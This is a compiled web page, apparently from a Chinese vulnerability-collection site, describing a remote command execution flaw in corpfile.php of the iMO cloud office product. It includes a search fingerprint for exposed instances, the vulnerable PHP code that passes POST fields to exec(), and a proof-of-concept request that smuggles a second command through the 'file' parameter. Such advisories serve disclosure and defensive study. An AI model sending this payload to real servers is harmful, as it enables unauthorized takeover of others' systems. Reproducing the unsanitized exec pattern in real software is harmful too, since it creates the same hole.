import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as n,e as a}from"./app-58e4a7d6.js";const c={},d=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>imo 云办公室 corpfile.php 文件中参数过滤不足，导致可以随意进行命令拼接，获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>imo 云办公室
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;iMO-云办公室&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241717875.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>漏洞文件 corpfile.php</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
define(&#39;DELETE_FAILED&#39;, &#39;数据不存在，删除失败!&#39;);
define(&#39;DELETE_SUCCESS&#39;, &#39;数据存在，删除成功!&#39;);
switch($_POST[&#39;type&#39;])
{
  case &#39;corpLogo&#39;:
    $checkFile = exec(&#39;ls &#39; . $_POST[&#39;file&#39;]);
    $result = exec($_POST[&#39;command&#39;]);
    echo json_encode(array(&#39;cid&#39; =&gt; $_POST[&#39;cid&#39;], &#39;account&#39; =&gt; $_POST[&#39;account&#39;], &#39;command&#39; =&gt; $_POST[&#39;command&#39;], &#39;file&#39; =&gt; (($checkFile &amp;&amp; !$result) ? DELETE_SUCCESS : DELETE_FAILED)));
  break;

  case &#39;userLogo&#39;:
    $checkFile = exec(&#39;ls &#39; . $_POST[&#39;file&#39;]);
    $result = exec($_POST[&#39;command&#39;]);
    echo json_encode(array(&#39;uid&#39; =&gt; $_POST[&#39;uid&#39;], &#39;user_account&#39; =&gt; $_POST[&#39;user_account&#39;], &#39;command&#39; =&gt; $_POST[&#39;command&#39;], &#39;file&#39; =&gt; (($checkFile &amp;&amp; !$result) ? DELETE_SUCCESS : DELETE_FAILED)));
  break;

  case &#39;corpTemp&#39;:
    $checkFile = exec(&#39;ls &#39; . $_POST[&#39;file&#39;]);
    $result = exec($_POST[&#39;command&#39;]);
    echo json_encode(array(&#39;cid&#39; =&gt; $_POST[&#39;cid&#39;], &#39;account&#39; =&gt; $_POST[&#39;account&#39;], &#39;command&#39; =&gt; $_POST[&#39;command&#39;], &#39;file&#39; =&gt; (($checkFile &amp;&amp; !$result) ? DELETE_SUCCESS : DELETE_FAILED)));
  break;

  case &#39;chatLog&#39;:
    $checkFile = exec(&#39;ls &#39; . $_POST[&#39;file&#39;]);
    $result = exec($_POST[&#39;command&#39;]);
    echo json_encode(array(&#39;cid&#39; =&gt; $_POST[&#39;cid&#39;], &#39;account&#39; =&gt; $_POST[&#39;account&#39;], &#39;command&#39; =&gt; $_POST[&#39;command&#39;], &#39;file&#39; =&gt; (($checkFile &amp;&amp; !$result) ? DELETE_SUCCESS : DELETE_FAILED)));
  break;

  case &#39;multiChatLog&#39;:
    $checkFile = exec(&#39;ls &#39; . $_POST[&#39;file&#39;]);
    $result = exec($_POST[&#39;command&#39;]);
    echo json_encode(array(&#39;cid&#39; =&gt; $_POST[&#39;cid&#39;], &#39;account&#39; =&gt; $_POST[&#39;account&#39;], &#39;command&#39; =&gt; $_POST[&#39;command&#39;], &#39;file&#39; =&gt; (($checkFile &amp;&amp; !$result) ? DELETE_SUCCESS : DELETE_FAILED)));
  break;

  case &#39;groupChatLog&#39;:
    $checkFile = exec(&#39;ls &#39; . $_POST[&#39;file&#39;]);
    $result = exec($_POST[&#39;command&#39;]);
    echo json_encode(array(&#39;cid&#39; =&gt; $_POST[&#39;cid&#39;], &#39;account&#39; =&gt; $_POST[&#39;account&#39;], &#39;command&#39; =&gt; $_POST[&#39;command&#39;], &#39;file&#39; =&gt; (($checkFile &amp;&amp; !$result) ? DELETE_SUCCESS : DELETE_FAILED)));
  break;

  case &#39;backChatLog&#39;:
    $checkFile = exec(&#39;ls &#39; . $_POST[&#39;file&#39;]);
    $result = exec($_POST[&#39;command&#39;]);
    echo json_encode(array(&#39;cid&#39; =&gt; $_POST[&#39;cid&#39;], &#39;account&#39; =&gt; $_POST[&#39;account&#39;], &#39;command&#39; =&gt; $_POST[&#39;command&#39;], &#39;file&#39; =&gt; (($checkFile &amp;&amp; !$result) ? DELETE_SUCCESS : DELETE_FAILED)));
  break;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /corpfile.php

type=corpLogo&amp;command=id&amp;file=;pwd&gt;1.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241720866.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),l=[d];function s(r,t){return i(),n("div",null,l)}const u=e(c,[["render",s],["__file","imo 云办公室 corpfile.php 远程命令执行漏洞.html.vue"]]);export{u as default};
